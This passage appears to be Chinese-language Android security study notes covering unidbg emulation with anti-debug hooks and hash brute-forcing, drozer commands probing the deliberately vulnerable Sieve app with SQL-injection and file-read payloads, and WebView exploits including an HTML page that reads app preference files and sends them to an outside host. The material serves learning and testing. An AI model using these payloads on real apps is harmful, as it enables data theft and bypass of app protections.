import com.github.unidbg.linux.android.dvm.DalvikModule;
import com.github.unidbg.linux.android.dvm.DvmClass;
import com.github.unidbg.linux.android.dvm.DvmObject;
import com.github.unidbg.linux.android.dvm.VM;
import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;
import com.github.unidbg.memory.Memory;


import java.io.File;

public class MainActivity {

    private final AndroidEmulator emulator;
    private final VM vm;
    private final DvmClass targetClass;

    private MainActivity() {
        // 创建模拟器
        emulator = AndroidEmulatorBuilder.for64Bit()
                .setProcessName("com.example.demo3")
                .addBackendFactory(new DynarmicFactory(true))
                .build();
        // 设置SDK
        Memory memory = emulator.getMemory();
        LibraryResolver lr = new AndroidResolver(23);
        memory.setLibraryResolver(lr);
        // 创建虚拟机
        vm = emulator.createDalvikVM();
        // 详细log
        vm.setVerbose(true);
        // 加载so
        DalvikModule dm = vm.loadLibrary(new File("unidbg-android/src/test/resources/example_binaries/arm64-v8a/libdemo3.so"), false);
        // 动态注册JNI
        dm.callJNI_OnLoad(emulator);

        targetClass = vm.resolveClass("com/example/demo3/MainActivity");
    }

    public static void main(String[] args) {
        MainActivity thiz = new MainActivity();
        thiz.invokeStatic();
        thiz.invokeNonStatic();
    }

    // 调用静态方法
    public void invokeStatic() {
        int result = targetClass.callStaticJniMethodInt(emulator, "getStringLengthFromJNI(Ljava/lang/String;)I", "Hello, World!");
        System.out.println("getStringLengthFromJNI(\"Hello, World!\") => " + result);
    }

    // 调用非静态方法
    public void invokeNonStatic() {
        DvmObject<?> obj = ProxyDvmObject.createObject(vm, this);
        DvmObject<?> result = obj.callJniMethodObject(emulator, "getGreeting(Ljava/lang/String;)Ljava/lang/String;", "Zhang3");
        System.out.println("getGreeting(\"Zhang3\") => " + result.getValue());
    }
}
```

#### 补环境示例

```Java
package com.example.demo3;

import com.github.unidbg.AndroidEmulator;
import com.github.unidbg.LibraryResolver;
import com.github.unidbg.arm.backend.DynarmicFactory;
import com.github.unidbg.linux.android.AndroidEmulatorBuilder;
import com.github.unidbg.linux.android.AndroidResolver;
import com.github.unidbg.linux.android.dvm.*;
import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;
import com.github.unidbg.memory.Memory;

import java.io.File;

public class MainActivity extends AbstractJni {

    private final AndroidEmulator emulator;
    private final VM vm;
    private final DvmClass targetClass;
    private final DvmObject<?> thizObject;

    private MainActivity() {
        // 创建模拟器
        emulator = AndroidEmulatorBuilder.for64Bit()
                .setProcessName("com.example.demo3")
                .addBackendFactory(new DynarmicFactory(true))
                .build();
        // 设置SDK
        Memory memory = emulator.getMemory();
        LibraryResolver lr = new AndroidResolver(23);
        memory.setLibraryResolver(lr);
        // 创建虚拟机
        vm = emulator.createDalvikVM();
        // 详细log
        vm.setVerbose(true);
        // 设置JNI
        vm.setJni(this);
        // 加载so
        DalvikModule dm = vm.loadLibrary(new File("unidbg-android/src/test/resources/example_binaries/arm64-v8a/libdemo3.so"), false);
        // 动态注册JNI
        dm.callJNI_OnLoad(emulator);

        targetClass = vm.resolveClass("com/example/demo3/MainActivity");
        thizObject = ProxyDvmObject.createObject(vm, this);
    }

    public static void main(String[] args) {
        MainActivity thiz = new MainActivity();
        thiz.invokeStatic();
        thiz.invokeNonStatic();
        thiz.computeMD5Invoke();
        thiz.computeMD5NonStaticInvoke();
    }

    // 调用静态方法
    public void invokeStatic() {
        int result = targetClass.callStaticJniMethodInt(emulator, "getStringLengthFromJNI(Ljava/lang/String;)I", "Hello, World!");
        System.out.println("getStringLengthFromJNI(\"Hello, World!\") => " + result);
    }

    // 调用非静态方法
    public void invokeNonStatic() {
        DvmObject<?> result = thizObject.callJniMethodObject(emulator, "getGreeting(Ljava/lang/String;)Ljava/lang/String;", "Zhang3");
        System.out.println("getGreeting(\"Zhang3\") => " + result.getValue());
    }

    public void computeMD5Invoke() {
        DvmObject<?> result = targetClass.callStaticJniMethodObject(emulator, "computeMD5(Ljava/lang/String;)Ljava/lang/String;", "123456");
        System.out.println("computeMD5(\"123456\") => " + result.getValue());
    }

    public void computeMD5NonStaticInvoke() {
        DvmObject<?> result = thizObject.callJniMethodObject(emulator, "computeMD5NonStatic(Ljava/lang/String;)Ljava/lang/String;", "123456");
        System.out.println("computeMD5NonStatic(\"123456\") => " + result.getValue());
    }
}
```

`com/github/unidbg/linux/android/dvm/AbstractJni.java`

```Java
	@Override
    public DvmObject<?> callObjectMethodV(BaseVM vm, DvmObject<?> dvmObject, String signature, VaList vaList) {
        switch (signature) {
			// add case
            case "com/example/demo3/MainActivity->md5NonStatic(Ljava/lang/String;)Ljava/lang/String;":
                StringObject input = vaList.getObjectArg(0);
                try {
                    MessageDigest md = MessageDigest.getInstance("MD5");
                    byte[] messageDigest = md.digest(input.getValue().getBytes());
                    BigInteger number = new BigInteger(1, messageDigest);
                    String result = number.toString(16);
                    while (result.length() < 32) {
                        result = "0" + result;
                    }
                    return new StringObject(vm, result);
                } catch (NoSuchAlgorithmException e) {
                    throw new IllegalStateException(e);
                }
			    // ...
		}
	}

	@Override
    public DvmObject<?> callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) {
        switch (signature) {
		    // add case
            case "com/example/demo3/MainActivity->md5(Ljava/lang/String;)Ljava/lang/String;":
                StringObject input = vaList.getObjectArg(0);
                try {
                    MessageDigest md = MessageDigest.getInstance("MD5");
                    byte[] messageDigest = md.digest(input.getValue().getBytes());
                    BigInteger number = new BigInteger(1, messageDigest);
                    String result = number.toString(16);
                    while (result.length() < 32) {
                        result = "0" + result;
                    }
                    return dvmClass.newObject(result);
                } catch (NoSuchAlgorithmException e) {
                    throw new IllegalStateException(e);
                }
                // ...
        }
    }
```

#### Hook示例

```Java
package com.roysue.easyso1;

import com.github.unidbg.AndroidEmulator;
import com.github.unidbg.Emulator;
import com.github.unidbg.LibraryResolver;
import com.github.unidbg.Module;
import com.github.unidbg.arm.HookStatus;
import com.github.unidbg.arm.backend.DynarmicFactory;
import com.github.unidbg.hook.ReplaceCallback;
import com.github.unidbg.hook.hookzz.Dobby;
import com.github.unidbg.linux.android.AndroidEmulatorBuilder;
import com.github.unidbg.linux.android.AndroidResolver;
import com.github.unidbg.linux.android.dvm.*;
import com.github.unidbg.linux.android.dvm.jni.ProxyDvmObject;
import com.github.unidbg.memory.Memory;

import java.io.File;

public class MainActivity extends AbstractJni {
    private final AndroidEmulator emulator;
    private final VM vm;
    private final DvmClass targetClass;
    private final DvmObject<?> thizObject;
    private final Module module;

    private MainActivity() {
        emulator = AndroidEmulatorBuilder.for32Bit()
                .setProcessName("com.roysue.easyso1")
                .addBackendFactory(new DynarmicFactory(true))
                .build();
        Memory memory = emulator.getMemory();
        LibraryResolver lr = new AndroidResolver(23);
        memory.setLibraryResolver(lr);
        vm = emulator.createDalvikVM();
        vm.setVerbose(false);
        vm.setJni(this);
        DalvikModule dm = vm.loadLibrary(new File("unidbg-android/src/test/resources/example_binaries/armeabi-v7a/libroysue.so"), false);
        dm.callJNI_OnLoad(emulator);
        module = dm.getModule();
        targetClass = vm.resolveClass("com/roysue/easyso1/MainActivity");
        thizObject = ProxyDvmObject.createObject(vm, this);
    }

    public static void main(String[] args) {
        MainActivity thiz = new MainActivity();
        thiz.hook();
        for (int i = 0; i < 100000; i++) {
            if (i % 10000 == 0) {
                System.out.println("Now is: " + i);
            }
            String formattedNumber = String.format("%05d", i);
            if (thiz.callSign(formattedNumber).compareTo("57fdeca2cac0509b2e9e5c52a5b573c1608a33ac1ffb9e8210d2e129557e7f1b") == 0) {
                System.out.println("find it! " + formattedNumber);
                break;
            }
        }
//        System.out.println(thiz.callSign("87654"));
    }

    public void hook() {
        Dobby dobby = Dobby.getInstance(emulator);
        dobby.replace(module.findSymbolByName("_Z24function_check_tracerPIDv"), new ReplaceCallback() {
            @Override
            public HookStatus onCall(Emulator<?> emulator, long originFunction) {
                return HookStatus.LR(emulator, 0);
            }
        });
        dobby.replace(module.findSymbolByName("_Z24system_getproperty_checkv"), new ReplaceCallback() {
            @Override
            public HookStatus onCall(Emulator<?> emulator, long originFunction) {
                return HookStatus.LR(emulator, 0);
            }
        });
    }

    public String callSign(String str) {
        DvmObject<?> result = targetClass.callStaticJniMethodObject(emulator, "Sign(Ljava/lang/String;)Ljava/lang/String;", str);
        return result.getValue().toString();
    }
}

```

#### 通过安装包运行案例

```java
package com.roysue.solov;  
  
import com.github.unidbg.AndroidEmulator;  
import com.github.unidbg.Module;  
import com.github.unidbg.linux.android.AndroidEmulatorBuilder;  
import com.github.unidbg.linux.android.AndroidResolver;  
import com.github.unidbg.linux.android.dvm.*;  
import com.github.unidbg.memory.Memory;  
  
import java.io.File;  
  
public class MainActivity2 extends AbstractJni {  
  
    public static void main(String[] args) {  
        long start = System.currentTimeMillis();  
        com.roysue.solov.MainActivity2 mainActivity = new com.roysue.solov.MainActivity2();  
        System.out.println("load offset=" + (System.currentTimeMillis() - start) + "ms");  
        mainActivity.crack();  
    }  
  
    private final AndroidEmulator emulator;  
    private final VM vm;  
    private final String thizName = "com.roysue.r1zapatandk.MainActivity";  
    private final DvmClass dvmClass;  
  
    private MainActivity2() {  
        emulator = AndroidEmulatorBuilder.for32Bit().build();  
        Memory memory = emulator.getMemory();  
        memory.setLibraryResolver(new AndroidResolver(23));  
        vm = emulator.createDalvikVM(new File("unidbg-android/src/test/resources/apks/r1zapatandk.apk"));  
        vm.setVerbose(false);  
        DalvikModule dalvikModule = vm.loadLibrary("native-lib", false);  
        vm.setJni(this);  
        Module module = dalvikModule.getModule();  
        vm.callJNI_OnLoad(emulator, module);  
        dvmClass = vm.resolveClass(thizName);  
    }  
  
    private void crack() {  
        for (int i = 234560; i < 999999; i++) {  
            DvmObject res = dvmClass.callStaticJniMethodObject(  
                    emulator,  
                    "Sign(Ljava/lang/String;)Ljava/lang/String;",  
                    new String(i + "")  
            );  
            if (res.getValue().toString().equals("508df4cb2f4d8f80519256258cfb975f")) {  
                System.out.println("[*] bingo: " + i);  
                break;            }  
        }  
    }  
}
```

### 客户端漏洞

#### 四大组件漏洞

- 启动

```bash
adb forward tcp:31415 tcp:31415
# drozer console connect --server HOST[:PORT]
drozer console connect --server 127.0.0.1
```

- 列举可用模块

```
list
```

- 查看指定模块如何运行

```
run <MODULE> --help

help <MODULE>
```

- 通过包名搜索应用

```
run app.package.list -f zhang3
```

- 获取指定应用的基本信息

```
run app.package.info -a com.withsecure.example.sieve
```

- 获取指定应用暴露的攻击面

```
run app.package.attacksurface com.withsecure.example.sieve
```

- 获取指定应用导出的Activity信息

```
run app.activity.info -a com.withsecure.example.sieve
```

- 启动指定应用的指定Activity

```
run app.activity.start --component com.withsecure.example.sieve com.withsecure.example.sieve.activity.PWList
```

- 获取指定应用导出的Content Provider信息

```
run app.provider.info -a com.withsecure.example.sieve
```

- 获取指定应用导出的Content Provider相关的URI

```
run scanner.provider.finduris -a com.withsecure.example.sieve
```

- 向指定Content Provider URI发送查询请求

```
run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/

# SQL 注入测试
run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --projection "'"
run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --selection "'"
run app.provider.query content://com.withsecure.example.sieve.provider.DBContentProvider/Passwords/ --projection "* from key;--"
```

- 自动测试指定应用的Content Provider是否存在SQL注入漏洞

```
run scanner.provider.injection -a com.withsecure.example.sieve
```

- 当Content Provider支持文件操作时 可以通过它读写文件系统

```
run app.provider.read content://com.withsecure.example.sieve.provider.FileBackupProvider/etc/hosts
run app.provider.download content://com.withsecure.example.sieve.provider.FileBackupProvider/data/data/com.withsecure.example.sieve/databases/database.db drozer/sieve.db
```

- 获取指定应用导出的Service信息

```
run app.service.info -a com.withsecure.example.sieve
```

- 向指定Service发送消息

```
run app.service.send com.withsecure.example.sieve com.withsecure.example.sieve.service.CryptoService --msg 13476 0 0 --extra string com.withsecure.example.sieve.KEY 0123456789abcdef --extra bytearray com.withsecure.example.sieve.PASSWORD base64(V1RVRhcRAxQSHw==) --bundle-as-obj
```

#### 其它

- 页面劫持

```bash
adb shell am start -n com.zhang3.myapp/.TransparentActivity
```

- 防截屏/录屏检测

```bash
adb shell screencap /sdcard/Download/hijack.png
```

#### WebView漏洞

- WebView漏洞

```bash
# 导出的WebView利用
# 导出的Activity 其中引入了android.webkit.WebView
# 案例：WebView劫持
adb shell am start -n <componentname> --es [key] [value]
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "https://m.weibo.cn"

# 启用了setAllowUniversalAccessFromFileURLs
# 或 setAllowFileAccessFromFileURLs
# 此设置删除了所有同源策略限制 允许webview向本地文件发出web请求
# 案例：文件窃取、XSS
adb push affu.html /sdcard/Download/
adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url "file:///sdcard/Download/affu.html"

# 启用了JavaScript接口
# webView.addJavascriptInterface(new WebAppInterface(this), "Android"); // 这里是Android
# 案例：RCE（令牌窃取）、XSS
adb shell am start -n com.tmh.vulnwebview/.Supportwebview --es support_url "https://local.zhang3.cn:7331/jsi.html"
```

上述利用中用到的本地恶意网页`affu.html`内容为

```html
<script>
    const url = 'file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml'; // 读取应用本地文件内容
    function load(url) {
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                // 发送文件内容到服务器上
                // 这里需要用到HTTPS和域名
                fetch('https://local.zhang3.cn:7331/?data=' + btoa(xhr.responseText));
            }
        }
        xhr.open('GET', url, true);
        xhr.send('');
    }
    load(url);
</script>
```

需要用域名 暂时简单弹一个XSS PoC代替吧

```html
<ScRIpt>prompt`3334444`</sCriPT>
```

WebView JS接口调用Java代码示例 `jsi.html` 内容为 需要将它放到HTTPS服务器上才能用

```html
<script type="text/javascript">
document.write("token: " + Android.getUserToken());
</script>
```


### ART

#### C++内存布局

- 可以将C++中的类，当作C中的结构体，成员函数不占用空间（虚表除外）。相较于普通函数，成员函数多了一个参数，第一个参数为对象指针。
- 静态字段不占用对象内存，普通变量占用内存，但要考虑对齐
- 虚函数和虚继承会多占用一个指针空间，指向虚表（32位4字节，64位下8字节）
- 有一个虚继承，同时自己有虚函数，也只有一个虚表（自己的虚函数依次添加到继承的虚表中）。如果发生了覆盖，则以覆盖优先，不用在表项后继续添加。
- 多个虚继承会有多个虚表，即占用不止一个指针空间。自己如果有虚函数，插入第一张虚表末尾。